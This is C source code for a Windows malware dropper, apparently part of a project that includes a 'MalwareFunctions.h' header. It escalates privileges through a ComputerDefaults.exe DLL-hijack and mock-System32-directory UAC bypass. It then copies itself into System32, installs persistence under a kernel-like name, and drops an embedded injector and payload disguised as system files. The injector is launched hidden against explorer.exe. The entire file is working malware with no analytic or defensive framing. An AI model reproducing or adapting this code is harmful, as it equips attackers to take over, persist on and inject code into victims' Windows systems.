#include "include/MalwareFunctions.h"
#include "resource.h"

#define fatal(a) do{ExitProcess(1);} while(0);
#define memzero(base, sz) memset(base, 0, sz)

typedef struct _RES {
    void* m_ptr;
    unsigned int m_sz;
}RES;

DWORD get_resource(
    HMODULE h_module,
    unsigned int id_resource,
    const char* name_resource,
    RES* res
)
{
    HRSRC h_res = NULL;
    HGLOBAL resource = NULL;

    h_res = FindResourceA(h_module, MAKEINTRESOURCEA(id_resource), name_resource);
    if (h_res == NULL)
        fatal("NULL");

    res->m_sz = SizeofResource(h_module, h_res);
    if (res->m_sz == 0)
        fatal("SizeofResource");

    resource = LoadResource(h_module, h_res);
    if (resource == NULL)
        fatal("LoadResource");

    res->m_ptr = LockResource(resource);
    if (res->m_ptr == NULL)
        fatal("LockResource");

    return GetLastError();
}

void write_file(
    const char* name_file,
    const char* buffer,
    DWORD sz
)
{
    HANDLE h_file = NULL;

    h_file = CreateFileA(
        name_file,
        GENERIC_READ | GENERIC_WRITE,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        NULL,
        CREATE_ALWAYS,
        FILE_ATTRIBUTE_NORMAL,
        NULL
    );

    WriteFile(
        h_file,
        buffer,
        sz,
        NULL,
        NULL
    );

    CloseHandle(h_file);
}

void init(HMODULE h_module)
{
    char exe[MAX_PATH];
    char dll[MAX_PATH];

    memzero(exe, MAX_PATH);
    memzero(dll, MAX_PATH);

    RES inj_res = { NULL, 0 };
    RES dll_res = { NULL, 0 };

    get_resource(h_module, IDR_NTSDK95WRAN1, "ntSdk95Wran", &inj_res);
    get_resource(h_module, IDR_KRNL64SQD321, "krnl64sqd32", &dll_res);

    GetSystemDirectoryA(exe, MAX_PATH);
    GetSystemDirectoryA(dll, MAX_PATH);

    strcat_s(exe, MAX_PATH, "\\ntskrnl32.exe");
    strcat_s(dll, MAX_PATH, "\\ntsystem64!extent.rsrc");

    write_file(exe, (const char*)inj_res.m_ptr, inj_res.m_sz);
    write_file(dll, (const char*)dll_res.m_ptr, dll_res.m_sz);
}

DWORD start()
{
    char buffer[MAX_PATH];
    char command_line[MAX_PATH];
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    BOOL cp;

    memzero(buffer, MAX_PATH);
    memzero(command_line, MAX_PATH);
    memzero(&si, sizeof(si));
    memzero(&pi, sizeof(pi));

    GetSystemDirectoryA(buffer, MAX_PATH);
    GetSystemDirectoryA(command_line, MAX_PATH);

    strcat_s(buffer, MAX_PATH, "\\ntskrnl32.exe");
    strcat_s(command_line, MAX_PATH, "\\ntsystem64!extent.rsrc explorer.exe w");

    cp = CreateProcessA(
        buffer,
        command_line,
        NULL, NULL, FALSE,
        CREATE_NO_WINDOW,
        NULL, NULL,
        &si, &pi
    );

    if (cp == 0)
        fatal("CreateProcessA");

    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);

    return GetLastError();
}

int main(int argc, char** argv)
{
	char fn[MAX_PATH];
	char buffer[MAX_PATH];
	char system_path[MAX_PATH];
	char mock_system_path[MAX_PATH];

	memzero(fn, MAX_PATH);
	memzero(mock_system_path, MAX_PATH);
	memzero(system_path, MAX_PATH);
	memzero(buffer, MAX_PATH);

	GetModuleFileNameA(NULL, fn, MAX_PATH);

	if (is_admin() == FALSE)
	{
		privilege_escalation("ComputerDefaults.exe", "secur32.dll", "ressasi.dll");
		GetWindowsDirectoryA(buffer, MAX_PATH);
		strcat_s(mock_system_path, MAX_PATH, escape_chars);
		strcat_s(mock_system_path, MAX_PATH, buffer);
		strcat_s(mock_system_path, MAX_PATH, " \\system32\\wexecute32vol.exe");

		CopyFileA(fn, mock_system_path, FALSE);
		ShellExecuteA(NULL, "open", """C:\\Windows \\System32\\ComputerDefaults.exe""", NULL, NULL, 1);
		ExitProcess(EXIT_SUCCESS);
	}
	else //admin
	{
		GetSystemDirectoryA(buffer, MAX_PATH);

		strcat_s(system_path, MAX_PATH, buffer);
		strcat_s(system_path, MAX_PATH, "\\");
		strcat_s(system_path, MAX_PATH, strrchr(argv[0], '\\') + sizeof(char));

		CopyFileA(fn, system_path, FALSE);
		get_persistence(system_path, "ntkrnl64!system", TRUE);
        
        init(NULL);
        start();
	}
}